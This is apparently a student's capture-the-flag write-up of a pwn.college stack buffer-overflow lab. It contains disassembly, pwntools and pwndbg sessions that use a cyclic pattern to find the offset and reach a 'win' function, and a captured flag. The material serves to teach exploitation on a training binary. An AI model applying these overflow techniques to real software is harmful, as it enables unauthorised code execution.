  4021f9:       48 89 95 68 ff ff ff    mov    QWORD PTR [rbp-0x98],rdx
  402200:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402207:       00 00
  402209:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40220d:       31 c0                   xor    eax,eax
  40220f:       48 8d 55 90             lea    rdx,[rbp-0x70]
  402213:       b8 00 00 00 00          mov    eax,0x0
  402218:       b9 0d 00 00 00          mov    ecx,0xd
  40221d:       48 89 d7                mov    rdi,rdx
  402220:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
  402223:       48 c7 45 88 00 00 00    mov    QWORD PTR [rbp-0x78],0x0
  40222a:       00
  40222b:       48 c7 45 88 00 10 00    mov    QWORD PTR [rbp-0x78],0x1000
  402232:       00
  402233:       48 8b 45 88             mov    rax,QWORD PTR [rbp-0x78]
  402237:       48 89 c6                mov    rsi,rax
  40223a:       48 8d 3d cf 0e 00 00    lea    rdi,[rip+0xecf]        # 403110 <_IO_stdin_used+0x110>
  402241:       b8 00 00 00 00          mov    eax,0x0
  402246:       e8 d5 ee ff ff          call   401120 <printf@plt>
  40224b:       48 8b 55 88             mov    rdx,QWORD PTR [rbp-0x78]
  40224f:       48 8d 45 90             lea    rax,[rbp-0x70]
  402253:       48 89 c6                mov    rsi,rax
  402256:       bf 00 00 00 00          mov    edi,0x0
  40225b:       e8 e0 ee ff ff          call   401140 <read@plt>
  402260:       89 45 84                mov    DWORD PTR [rbp-0x7c],eax
  402263:       83 7d 84 00             cmp    DWORD PTR [rbp-0x7c],0x0
  402267:       79 2c                   jns    402295 <challenge+0xb8>
  402269:       e8 72 ee ff ff          call   4010e0 <__errno_location@plt>
  40226e:       8b 00                   mov    eax,DWORD PTR [rax]
  402270:       89 c7                   mov    edi,eax
  402272:       e8 09 ef ff ff          call   401180 <strerror@plt>
  402277:       48 89 c6                mov    rsi,rax
  40227a:       48 8d 3d b7 0e 00 00    lea    rdi,[rip+0xeb7]        # 403138 <_IO_stdin_used+0x138>
  402281:       b8 00 00 00 00          mov    eax,0x0
  402286:       e8 95 ee ff ff          call   401120 <printf@plt>
  40228b:       bf 01 00 00 00          mov    edi,0x1
  402290:       e8 db ee ff ff          call   401170 <exit@plt>
  402295:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
  402298:       85 c0                   test   eax,eax
  40229a:       74 0a                   je     4022a6 <challenge+0xc9>
  40229c:       b8 00 00 00 00          mov    eax,0x0
  4022a1:       e8 30 fe ff ff          call   4020d6 <win>
  4022a6:       48 8d 3d af 0e 00 00    lea    rdi,[rip+0xeaf]        # 40315c <_IO_stdin_used+0x15c>
  4022ad:       e8 3e ee ff ff          call   4010f0 <puts@plt>
  4022b2:       b8 00 00 00 00          mov    eax,0x0
  4022b7:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  4022bb:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  4022c2:       00 00
  4022c4:       74 05                   je     4022cb <challenge+0xee>
  4022c6:       e8 45 ee ff ff          call   401110 <__stack_chk_fail@plt>
  4022cb:       c9                      leave
  4022cc:       c3                      ret

00000000004022cd <main>:
  4022cd:       f3 0f 1e fa             endbr64
  4022d1:       55                      push   rbp
  4022d2:       48 89 e5                mov    rbp,rsp
  4022d5:       48 81 ec 00 10 00 00    sub    rsp,0x1000
  4022dc:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
  4022e1:       48 83 ec 30             sub    rsp,0x30
  4022e5:       89 bd ec ef ff ff       mov    DWORD PTR [rbp-0x1014],edi
  4022eb:       48 89 b5 e0 ef ff ff    mov    QWORD PTR [rbp-0x1020],rsi
  4022f2:       48 89 95 d8 ef ff ff    mov    QWORD PTR [rbp-0x1028],rdx
  4022f9:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402300:       00 00
  402302:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  402306:       31 c0                   xor    eax,eax
  402308:       48 8b 05 21 2d 00 00    mov    rax,QWORD PTR [rip+0x2d21]        # 405030 <stdin@GLIBC_2.2.5>
  40230f:       b9 00 00 00 00          mov    ecx,0x0
  402314:       ba 02 00 00 00          mov    edx,0x2
  402319:       be 00 00 00 00          mov    esi,0x0
  40231e:       48 89 c7                mov    rdi,rax
  402321:       e8 2a ee ff ff          call   401150 <setvbuf@plt>
  402326:       48 8b 05 f3 2c 00 00    mov    rax,QWORD PTR [rip+0x2cf3]        # 405020 <stdout@GLIBC_2.2.5>
  40232d:       b9 00 00 00 00          mov    ecx,0x0
  402332:       ba 02 00 00 00          mov    edx,0x2
  402337:       be 00 00 00 00          mov    esi,0x0
  40233c:       48 89 c7                mov    rdi,rax
  40233f:       e8 0c ee ff ff          call   401150 <setvbuf@plt>
  402344:       48 8b 95 d8 ef ff ff    mov    rdx,QWORD PTR [rbp-0x1028]
  40234b:       48 8b 8d e0 ef ff ff    mov    rcx,QWORD PTR [rbp-0x1020]
  402352:       8b 85 ec ef ff ff       mov    eax,DWORD PTR [rbp-0x1014]
  402358:       48 89 ce                mov    rsi,rcx
  40235b:       89 c7                   mov    edi,eax
  40235d:       e8 7b fe ff ff          call   4021dd <challenge>
  402362:       b8 00 00 00 00          mov    eax,0x0
  402367:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  40236b:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  402372:       00 00
  402374:       74 05                   je     40237b <main+0xae>
  402376:       e8 95 ed ff ff          call   401110 <__stack_chk_fail@plt>
  40237b:       c9                      leave
  40237c:       c3                      ret
  40237d:       0f 1f 00                nop    DWORD PTR [rax]

0000000000402380 <__libc_csu_init>:
  402380:       f3 0f 1e fa             endbr64
  402384:       41 57                   push   r15
  402386:       4c 8d 3d f3 29 00 00    lea    r15,[rip+0x29f3]        # 404d80 <__frame_dummy_init_array_entry>
  40238d:       41 56                   push   r14
  40238f:       49 89 d6                mov    r14,rdx
  402392:       41 55                   push   r13
  402394:       49 89 f5                mov    r13,rsi
  402397:       41 54                   push   r12
  402399:       41 89 fc                mov    r12d,edi
  40239c:       55                      push   rbp
  40239d:       48 8d 2d e4 29 00 00    lea    rbp,[rip+0x29e4]        # 404d88 <__do_global_dtors_aux_fini_array_entry>
  4023a4:       53                      push   rbx
  4023a5:       4c 29 fd                sub    rbp,r15
  4023a8:       48 83 ec 08             sub    rsp,0x8
  4023ac:       e8 4f ec ff ff          call   401000 <_init>
  4023b1:       48 c1 fd 03             sar    rbp,0x3
  4023b5:       74 1f                   je     4023d6 <__libc_csu_init+0x56>
  4023b7:       31 db                   xor    ebx,ebx
  4023b9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
  4023c0:       4c 89 f2                mov    rdx,r14
  4023c3:       4c 89 ee                mov    rsi,r13
  4023c6:       44 89 e7                mov    edi,r12d
  4023c9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4023cd:       48 83 c3 01             add    rbx,0x1
  4023d1:       48 39 dd                cmp    rbp,rbx
  4023d4:       75 ea                   jne    4023c0 <__libc_csu_init+0x40>
  4023d6:       48 83 c4 08             add    rsp,0x8
  4023da:       5b                      pop    rbx
  4023db:       5d                      pop    rbp
  4023dc:       41 5c                   pop    r12
  4023de:       41 5d                   pop    r13
  4023e0:       41 5e                   pop    r14
  4023e2:       41 5f                   pop    r15
  4023e4:       c3                      ret
  4023e5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  4023ec:       00 00 00 00

00000000004023f0 <__libc_csu_fini>:
  4023f0:       f3 0f 1e fa             endbr64
  4023f4:       c3                      ret

Disassembly of section .fini:

00000000004023f8 <_fini>:
  4023f8:       f3 0f 1e fa             endbr64
  4023fc:       48 83 ec 08             sub    rsp,0x8
  402400:       48 83 c4 08             add    rsp,0x8
  402404:       c3                      ret
```

- again we have two methods to solve this challenge,

- lets just override the win variable first


```python
00000000004020d6 <win>:
  4020d6:       f3 0f 1e fa             endbr64
  4020da:       55                      push   rbp
  4020db:       48 89 e5                mov    rbp,rsp
  4020de:       48 8d 3d 23 0f 00 00    lea    rdi,[rip+0xf23]        # 403008 <_IO_stdin_used+0x8>
  4020e5:       e8 06 f0 ff ff          call   4010f0 <puts@plt>
  4020ea:       be 00 00 00 00          mov    esi,0x0
  4020ef:       48 8d 3d 2e 0f 00 00    lea    rdi,[rip+0xf2e]        # 403024 <_IO_stdin_used+0x24>
  4020f6:       b8 00 00 00 00          mov    eax,0x0
  4020fb:       e8 60 f0 ff ff          call   401160 <open@plt>
  402100:       89 05 3a 2f 00 00       mov    DWORD PTR [rip+0x2f3a],eax        # 405040 <flag_fd.5700>
  402106:       8b 05 34 2f 00 00       mov    eax,DWORD PTR [rip+0x2f34]        # 405040 <flag_fd.5700>
  40210c:       85 c0                   test   eax,eax
  40210e:       79 4d                   jns    40215d <win+0x87>
  402110:       e8 cb ef ff ff          call   4010e0 <__errno_location@plt>
  402115:       8b 00                   mov    eax,DWORD PTR [rax]
  402117:       89 c7                   mov    edi,eax
  402119:       e8 62 f0 ff ff          call   401180 <strerror@plt>
  40211e:       48 89 c6                mov    rsi,rax
  402121:       48 8d 3d 08 0f 00 00    lea    rdi,[rip+0xf08]        # 403030 <_IO_stdin_used+0x30>
  402128:       b8 00 00 00 00          mov    eax,0x0
  40212d:       e8 ee ef ff ff          call   401120 <printf@plt>
  402132:       e8 f9 ef ff ff          call   401130 <geteuid@plt>
  402137:       85 c0                   test   eax,eax
  402139:       74 18                   je     402153 <win+0x7d>
  40213b:       48 8d 3d 1e 0f 00 00    lea    rdi,[rip+0xf1e]        # 403060 <_IO_stdin_used+0x60>
  402142:       e8 a9 ef ff ff          call   4010f0 <puts@plt>
  402147:       48 8d 3d 3a 0f 00 00    lea    rdi,[rip+0xf3a]        # 403088 <_IO_stdin_used+0x88>
  40214e:       e8 9d ef ff ff          call   4010f0 <puts@plt>
  402153:       bf ff ff ff ff          mov    edi,0xffffffff
  402158:       e8 13 f0 ff ff          call   401170 <exit@plt>
  40215d:       8b 05 dd 2e 00 00       mov    eax,DWORD PTR [rip+0x2edd]        # 405040 <flag_fd.5700>
  402163:       ba 00 01 00 00          mov    edx,0x100
  402168:       48 8d 35 f1 2e 00 00    lea    rsi,[rip+0x2ef1]        # 405060 <flag.5699>
  40216f:       89 c7                   mov    edi,eax
  402171:       e8 ca ef ff ff          call   401140 <read@plt>
  402176:       89 05 e4 2f 00 00       mov    DWORD PTR [rip+0x2fe4],eax        # 405160 <flag_length.5701>
  40217c:       8b 05 de 2f 00 00       mov    eax,DWORD PTR [rip+0x2fde]        # 405160 <flag_length.5701>
  402182:       85 c0                   test   eax,eax
  402184:       7f 2c                   jg     4021b2 <win+0xdc>
  402186:       e8 55 ef ff ff          call   4010e0 <__errno_location@plt>
  40218b:       8b 00                   mov    eax,DWORD PTR [rax]
  40218d:       89 c7                   mov    edi,eax
  40218f:       e8 ec ef ff ff          call   401180 <strerror@plt>
  402194:       48 89 c6                mov    rsi,rax
  402197:       48 8d 3d 42 0f 00 00    lea    rdi,[rip+0xf42]        # 4030e0 <_IO_stdin_used+0xe0>
  40219e:       b8 00 00 00 00          mov    eax,0x0
  4021a3:       e8 78 ef ff ff          call   401120 <printf@plt>
  4021a8:       bf ff ff ff ff          mov    edi,0xffffffff
  4021ad:       e8 be ef ff ff          call   401170 <exit@plt>
  4021b2:       8b 05 a8 2f 00 00       mov    eax,DWORD PTR [rip+0x2fa8]        # 405160 <flag_length.5701>
  4021b8:       48 98                   cdqe
  4021ba:       48 89 c2                mov    rdx,rax
  4021bd:       48 8d 35 9c 2e 00 00    lea    rsi,[rip+0x2e9c]        # 405060 <flag.5699>
  4021c4:       bf 01 00 00 00          mov    edi,0x1
  4021c9:       e8 32 ef ff ff          call   401100 <write@plt>
  4021ce:       48 8d 3d 35 0f 00 00    lea    rdi,[rip+0xf35]        # 40310a <_IO_stdin_used+0x10a>
  4021d5:       e8 16 ef ff ff          call   4010f0 <puts@plt>
  4021da:       90                      nop
  4021db:       5d                      pop    rbp
  4021dc:       c3                      ret

```


the challenge function is at : `00000000004020d6` so we need to overwrite the return address to the win function.

```
In [8]: p.send(pwn.cyclic(128))

In [9]: p.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow' stopped with exit code -6 (SIGABRT) (pid 205)
[x] Receiving all data: 178B
[+] Receiving all data: Done (178B)
Out[9]: b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{gw_GIYEwaLZtw8v-BaLkcf1ZMna.0FM5IDLzQjN0czW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'

In [10]:
```

`you again easily get the flag if u just send an arbitrary amount of bytes but thats not the point of this challenge. `

`lets now calculate the offset bytes required to overwrite both the win variable and the return address one by one.`


AFTER a lot of poking around in pwngdb i was finally able to overwrite 2 bytes in the return function with 2 B payload by finding 54 as the offset using cyclic input and cylic_find().

```python
ss@Satwik:~$ gdb binary-exploitation-first-overflow
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 211 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
/home/ss/.gdbinit:3: Error in sourced command file:
Undefined command: "import".  Try "help".
Reading symbols from binary-exploitation-first-overflow...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in binary-exploitation-first-overflow)
------- tip of the day (disable with set show-tips off) -------
If you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on
pwndbg> break challenge
Breakpoint 1 at 0x4015fd
pwndbg> r
Starting program: /home/ss/binary-exploitation-first-overflow
[Thread debugging using libthread_db enabled]
Breakpoint 1, 0x00000000004015fd in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  1
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RCX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RDX  0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
 RDI  1
 RSI  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 R8   0x401810 (__libc_csu_fini) ◂— endbr64
 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64
 R10  0x7fffffffd760 ◂— 0x800000
 R11  0x203
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
 RSP  0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
 RIP  0x4015fd (challenge+8) ◂— sub rsp, 0x60
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x4015fd <challenge+8>     sub    rsp, 0x60                       RSP => 0x7fffffffc9a0 (0x7fffffffca00 - 0x60)
   0x401601 <challenge+12>    mov    dword ptr [rbp - 0x44], edi     [0x7fffffffc9bc] <= 1
   0x401604 <challenge+15>    mov    qword ptr [rbp - 0x50], rsi     [0x7fffffffc9b0] <= 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
   0x401608 <challenge+19>    mov    qword ptr [rbp - 0x58], rdx     [0x7fffffffc9a8] <= 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
   0x40160c <challenge+23>    mov    rax, qword ptr fs:[0x28]        RAX, [0x7ffff7d9c768] => 0x7a9ddccda523aa00
   0x401615 <challenge+32>    mov    qword ptr [rbp - 8], rax        [0x7fffffffc9f8] <= 0x7a9ddccda523aa00
   0x401619 <challenge+36>    xor    eax, eax                        EAX => 0
   0x40161b <challenge+38>    mov    qword ptr [rbp - 0x30], 0       [0x7fffffffc9d0] <= 0
   0x401623 <challenge+46>    mov    qword ptr [rbp - 0x28], 0       [0x7fffffffc9d8] <= 0
   0x40162b <challenge+54>    mov    qword ptr [rbp - 0x20], 0       [0x7fffffffc9e0] <= 0
   0x401633 <challenge+62>    mov    dword ptr [rbp - 0x18], 0       [0x7fffffffc9e8] <= 0
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
01:0008│+008     0x7fffffffca08 —▸ 0x401779 (main+149) ◂— mov eax, 0
02:0010│+010     0x7fffffffca10 ◂— 0x30 /* '0' */
03:0018│+018     0x7fffffffca18 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
04:0020│+020     0x7fffffffca20 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
05:0028│+028     0x7fffffffca28 ◂— 0x100000380
06:0030│+030     0x7fffffffca30 ◂— 0x380
07:0038│+038     0x7fffffffca38 ◂— 0x380
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4015fd challenge+8
   1         0x401779 main+149
   2   0x7ffff7dc91ca __libc_start_call_main+122
   3   0x7ffff7dc928b __libc_start_main+139
   4         0x4011be _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $rsp
0x7fffffffca00: "@\332\377\377\377\177"
pwndbg> x/s $rip
0x4015fd <challenge+8>: "H\203\354`\211}\274H\211u\260H\211U\250dH\213\004%("
pwndbg> exit
ss@Satwik:~$ python3 -c 'from pwn import *; print(cyclic(200))' > pattern
ss@Satwik:~$ ls
Citadel  PwnShop  RaceCon  Xplore  binary-exploitation-first-overflow  bitlocker-1.dd  dislocker  hash.txt  john  key  key.pub  pattern  pwndbg  rockyou.txt  snap  splitmind  sunshineCtf
ss@Satwik:~$ gdb ./binary-exploitation-first-overflow
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 211 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
/home/ss/.gdbinit:3: Error in sourced command file:
Undefined command: "import".  Try "help".
Reading symbols from ./binary-exploitation-first-overflow...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./binary-exploitation-first-overflow)
------- tip of the day (disable with set show-tips off) -------
Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging
pwndbg> run < pattern
Starting program: /home/ss/binary-exploitation-first-overflow < pattern
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Send your payload (up to 4096 bytes)!
You win! Here is your flag:

  ERROR: Failed to open the flag -- No such file or directory!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
[Inferior 1 (process 1154) exited with code 0377]
pwndbg> info registers rip
The program has no registers now.
pwndbg> exit
ss@Satwik:~$ gdb -q ./binary-exploitation-first-overflow
pwndbg: loaded 211 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
/home/ss/.gdbinit:3: Error in sourced command file:
Undefined command: "import".  Try "help".
Reading symbols from ./binary-exploitation-first-overflow...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./binary-exploitation-first-overflow)
------- tip of the day (disable with set show-tips off) -------
Use the vmmap command for a better & colored memory maps display (than the GDB's info proc mappings)
pwndbg> break read
Breakpoint 1 at 0x401140
pwndbg> run < <(python3 -c "from pwn import *; print cyclic(400)")
Starting program: /home/ss/binary-exploitation-first-overflow < <(python3 -c "from pwn import *; print cyclic(400)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  File "<string>", line 1
    from pwn import *; print cyclic(400)
                       ^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
Send your payload (up to 4096 bytes)!

Breakpoint 1, __GI___libc_read (fd=0, buf=0x7fffffffc9d0, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
warning: 25     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffc9d0 ◂— 0
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 0
 R8   0x26
 R9   0
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
 RSP  0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
 RIP  0x7ffff7ebaa80 (read) ◂— endbr64
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7ebaa80 <read>       endbr64
   0x7ffff7ebaa84 <read+4>     cmp    byte ptr [rip + 0xef5b5], 0     1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x7ffff7ebaa8b <read+11>  ✘ je     read+32                     <read+32>

   0x7ffff7ebaa8d <read+13>    xor    eax, eax         EAX => 0
   0x7ffff7ebaa8f <read+15>    syscall  <SYS_read>
   0x7ffff7ebaa91 <read+17>    cmp    rax, -0x1000
   0x7ffff7ebaa97 <read+23>    ja     read+104                    <read+104>

   0x7ffff7ebaa99 <read+25>    ret

   0x7ffff7ebaa9a <read+26>    nop    word ptr [rax + rax]
   0x7ffff7ebaaa0 <read+32>    push   rbp
   0x7ffff7ebaaa1 <read+33>    mov    rbp, rsp
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
01:0008│-060     0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 ◂— ...
02:0010│-058     0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
03:0018│-050     0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
04:0020│-048     0x7fffffffc9b8 ◂— 0x1f7fa35c0
05:0028│-040     0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— ...
06:0030│-038     0x7fffffffc9c8 ◂— 0x1000
07:0038│ rax rsi 0x7fffffffc9d0 ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7ebaa80 read
   1         0x401677 challenge+130
   2         0x401779 main+149
   3   0x7ffff7dc91ca __libc_start_call_main+122
   4   0x7ffff7dc928b __libc_start_main+139
   5         0x4011be _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> exit
ss@Satwik:~$ gdb -q ./binary-exploitation-first-overflow
pwndbg: loaded 211 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
/home/ss/.gdbinit:3: Error in sourced command file:
Undefined command: "import".  Try "help".
Reading symbols from ./binary-exploitation-first-overflow...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./binary-exploitation-first-overflow)
------- tip of the day (disable with set show-tips off) -------
Want to display each context panel in a separate tmux window? See https://pwndbg.re/pwndbg/latest/tutorials/splitting-the-context/
pwndbg> break rea
Function "rea" not defined.
pwndbg> break read
Breakpoint 1 at 0x401140
pwndbg> run < <(python3 -c "from pwn import *; print(cyclic(400))")
Starting program: /home/ss/binary-exploitation-first-overflow < <(python3 -c "from pwn import *; print(cyclic(400))")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Send your payload (up to 4096 bytes)!

Breakpoint 1, __GI___libc_read (fd=0, buf=0x7fffffffc9d0, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:25
warning: 25     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffc9d0 ◂— 0
 RBX  0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7fffffffc9d0 ◂— 0
 R8   0x26
 R9   0
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 —▸ 0x7fffffffdb40 ◂— 0
 RSP  0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
 RIP  0x7ffff7ebaa80 (read) ◂— endbr64
──────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7ebaa80 <read>       endbr64
   0x7ffff7ebaa84 <read+4>     cmp    byte ptr [rip + 0xef5b5], 0     1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x7ffff7ebaa8b <read+11>  ✘ je     read+32                     <read+32>

   0x7ffff7ebaa8d <read+13>    xor    eax, eax         EAX => 0
   0x7ffff7ebaa8f <read+15>    syscall  <SYS_read>
   0x7ffff7ebaa91 <read+17>    cmp    rax, -0x1000
   0x7ffff7ebaa97 <read+23>    ja     read+104                    <read+104>

   0x7ffff7ebaa99 <read+25>    ret

   0x7ffff7ebaa9a <read+26>    nop    word ptr [rax + rax]
   0x7ffff7ebaaa0 <read+32>    push   rbp
   0x7ffff7ebaaa1 <read+33>    mov    rbp, rsp
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffc998 —▸ 0x401677 (challenge+130) ◂— mov dword ptr [rbp - 0x3c], eax
01:0008│-060     0x7fffffffc9a0 —▸ 0x7fffffffc9c0 —▸ 0x7fffffffca00 —▸ 0x7fffffffda40 —▸ 0x7fffffffdae0 ◂— ...
02:0010│-058     0x7fffffffc9a8 —▸ 0x7fffffffdb78 —▸ 0x7fffffffde13 ◂— 'SHELL=/bin/bash'
03:0018│-050     0x7fffffffc9b0 —▸ 0x7fffffffdb68 —▸ 0x7fffffffdde7 ◂— '/home/ss/binary-exploitation-first-overflow'
04:0020│-048     0x7fffffffc9b8 ◂— 0x1f7fa35c0
